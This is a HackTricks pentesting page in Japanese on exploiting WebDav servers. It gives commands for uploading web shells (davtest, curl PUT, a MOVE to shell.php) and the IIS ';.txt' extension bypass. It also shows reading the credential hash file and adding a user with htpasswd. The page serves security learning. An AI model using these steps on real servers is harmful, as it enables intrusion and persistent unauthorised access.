# WebDav

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks\&utm_medium=text\&utm_campaign=ppc\&utm_content=put-method-webdav)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築し、自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**をフォローしてください。**
* **ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}

**WebDav**が有効な**HTTPサーバー**を扱う際、正しい**資格情報**があれば**ファイルを操作**することが可能です。通常、これは**HTTP基本認証**を通じて確認されます。このようなサーバーを制御することは、しばしば**ウェブシェルのアップロードと実行**を伴います。

WebDavサーバーへのアクセスには通常、**有効な資格情報**が必要であり、[**WebDavブルートフォース**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth)はそれを取得する一般的な方法です。

ファイルアップロードの制限を克服するために、特にサーバーサイドスクリプトの実行を防ぐ制限がある場合、次のことができます：

* 制限がない場合、**実行可能な拡張子**を持つファイルを直接**アップロード**する。
* アップロードした非実行可能ファイル（.txtなど）の名前を実行可能な拡張子に**変更**する。
* アップロードした非実行可能ファイルを**コピー**し、その拡張子を実行可能なものに変更する。

## DavTest

**Davtest**は、**異なる拡張子を持つ複数のファイルをアップロードし**、拡張子が**実行されるかどうかを確認**します：
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
![](<../../.gitbook/assets/image (851).png>)

これは、**.txt**および**.html拡張子が実行されている**ことを意味するわけではありません。これは、**これらのファイルにアクセスできる**ことを意味します。

## Cadaver

このツールを使用して、**WebDav**サーバーに**手動で**接続し、（**アップロード**、**移動**、または**削除**などの）アクションを実行できます。
```
cadaver <IP>
```
## PUT リクエスト
```
curl -T 'shell.txt' 'http://$ip'
```
## MOVE リクエスト
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks\&utm_medium=text\&utm_campaign=ppc\&utm_content=put-method-webdav)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築し、自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

## IIS5/6 WebDavの脆弱性

この脆弱性は非常に興味深いです。**WebDav**は**.asp**拡張子のファイルを**アップロード**または**名前変更**することを**許可しません**。しかし、名前の末尾に**";.txt"**を追加することで**バイパス**できます。そうすると、そのファイルは**.aspファイルのように実行されます**（**".txt"の代わりに".html"を使用することもできますが、**";"を忘れないでください**）。

その後、あなたはシェルを**".txt"ファイル**として**アップロード**し、それを**".asp;.txt"**ファイルに**コピー/移動**できます。そのファイルにウェブサーバーを通じてアクセスすると、それは**実行されます**（cadaverは移動アクションが機能しなかったと言いますが、実際には機能しました）。

![](<../../.gitbook/assets/image (1092).png>)

## 資格情報のポスト

WebdavがApacheサーバーを使用している場合、Apacheで構成されたサイトを確認する必要があります。一般的に：\
&#xNAN;_**/etc/apache2/sites-enabled/000-default**_

その中に次のようなものが見つかるかもしれません：
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
ご覧のとおり、**webdav** サーバーの有効な **credentials** を含むファイルがあります:
```
/etc/apache2/users.password
```
このタイプのファイルの中には、**username** と **hash** のパスワードが含まれています。これらは、webdav サーバーがユーザーを認証するために使用している資格情報です。

これらを **crack** するか、何らかの理由で **webdav** サーバーに **access** したい場合は、**add more** を試みることができます：
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
新しい資格情報が機能しているか確認するには、次のことを行うことができます:
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## References

* [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)

{% hint style="success" %}
AWSハッキングを学び、練習する：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、練習する：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを送信してください。**

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks\&utm_medium=text\&utm_campaign=ppc\&utm_content=put-method-webdav)を使用して、世界で最も先進的なコミュニティツールによって駆動される**ワークフローを簡単に構築し、自動化**します。\
今すぐアクセスを取得： 

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}
